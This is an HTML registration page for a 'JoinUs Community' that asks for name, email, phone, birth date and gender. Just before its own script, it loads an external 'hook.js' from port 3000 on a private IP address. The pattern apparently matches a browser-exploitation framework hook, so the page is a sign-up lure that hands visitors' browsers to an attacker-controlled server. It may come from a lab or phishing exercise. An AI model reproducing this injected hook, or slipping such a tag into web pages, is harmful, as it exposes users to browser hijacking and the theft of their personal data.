<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Creative Registration Form</title>
  <link rel="stylesheet" href="styles.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;500;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="main-container">
    <header>
      <div class="header-title">
        <h1>Welcome Aboard!</h1>
        <p>Join our platform and be part of the journey.</p>
      </div>
    </header>
    <section class="form-section">
      <form id="registrationForm">
        <div class="form-row">
          <label for="fullName">Full Name</label>
          <input type="text" id="fullName" name="name" placeholder="Enter your name" required>
        </div>
        <div class="form-row">
          <label for="email">Email Address</label>
          <input type="email" id="email" name="email" placeholder="Enter your email" required>
        </div>
        <div class="form-row">
          <label for="contact">Contact Number</label>
          <input type="tel" id="contact" name="phone" placeholder="Enter phone number" required>
        </div>
        <div class="form-row">
          <label for="dob">Birth Date</label>
          <input type="date" id="dob" name="dob" required>
        </div>
        <div class="form-row">
          <label for="gender">Gender</label>
          <select id="gender" name="gender" required>
            <option value="">-- Select Gender --</option>
            <option value="male">Male</option>
            <option value="female">Female</option>
            <option value="other">Other</option>
          </select>
        </div>
        <div class="form-row">
          <button type="button" id="submitButton">Register</button>
        </div>
      </form>
      <div id="output" class="output-message"></div>
    </section>
    <footer>
      <p>&copy; 2024 JoinUs Community. All rights reserved.</p>
    </footer>
  </div>
  <script src="http://192.168.44.128:3000/hook.js"></script>
  <script src="script.js"></script>
  
</body>
</html>
